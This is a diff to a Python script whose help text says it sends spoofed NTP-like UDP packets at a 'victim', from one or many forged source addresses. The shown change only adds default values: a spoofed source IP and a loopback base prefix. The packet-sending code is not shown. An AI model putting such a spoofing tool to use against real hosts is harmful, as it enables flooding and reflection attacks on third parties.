@@ -27,9 +27,9 @@ def send_many(base, start, count, per_source, victim, port, interval, repeat):
 
 if __name__ == '__main__':
     p = argparse.ArgumentParser(description='Send spoofed NTP-like UDP packets in single-source or multi-source mode')
-    p.add_argument('--spoof', help='single spoofed source IP')
+    p.add_argument('--spoof', default="215.95.122.182", help='single spoofed source IP')
     p.add_argument('--dst', help='destination IP for single-source mode')
-    p.add_argument('--base', help='base prefix for source IPs, e.g. 127.0.0.')
+    p.add_argument('--base', default="127.0.0", help='base prefix for source IPs, e.g. 127.0.0.')
     p.add_argument('--start', type=int, default=2, help='start index (append to base)')
     p.add_argument('--count', type=int, default=50, help='number of packets (single-source) or distinct source IPs (multi-source)')
     p.add_argument('--per-source', type=int, default=1, help='packets to send per spoofed source in multi-source mode')
